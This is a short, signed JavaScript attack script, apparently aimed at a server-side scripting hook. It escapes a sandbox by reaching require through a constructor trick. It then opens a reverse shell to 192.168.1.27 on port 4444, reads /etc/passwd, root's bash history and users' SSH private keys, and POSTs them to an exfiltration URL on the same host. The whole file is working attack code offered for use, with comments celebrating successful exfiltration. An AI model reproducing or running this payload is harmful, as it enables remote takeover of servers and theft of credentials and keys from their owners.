//Verbesserte Version des Simplen RCE

class Script {
  process_incoming_request({ request }) {
    const require = console.log.constructor('return process.mainModule.require')();
    const { execSync } = require('child_process');
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);

    // Reverse Shell Verbindung
    var client = new net.Socket();
    client.connect(4444, "192.168.1.27", function() {
        console.log("Reverse Shell connection established.");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    // Verzögerung einfügen, um den Listener und die Shell nicht gleichzeitig zu aktivieren
    setTimeout(() => {
      // Exfiltration von sensitive Daten
      try {
        const sensitive_data = execSync('cat /etc/passwd; cat /root/.bash_history; cat /home/*/.ssh/id_rsa');
        
        // URL, an die die exfiltrierten Daten gesendet werden
        const exfil_url = "http://192.168.1.27/exfil";
        
        // Daten exfiltrieren
        fetch(exfil_url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ data: sensitive_data.toString() }),
        }).then(response => {
          if (response.ok) {
            console.log("Daten erfolgreich exfiltriert.");
          } else {
            console.log("Fehler bei der Exfiltration der Daten.");
          }
        }).catch(error => {
          console.error("Fehler beim Senden der Exfiltrationsdaten: ", error);
        });
      } catch (error) {
        console.error("Fehler beim Ausführen der Befehle zur Datenexfiltration: ", error);
      }
    }, 5000); // Warte 5 Sekunden, bevor die Daten exfiltriert werden

    return {};
  }
}

//By DaUfooo 2025
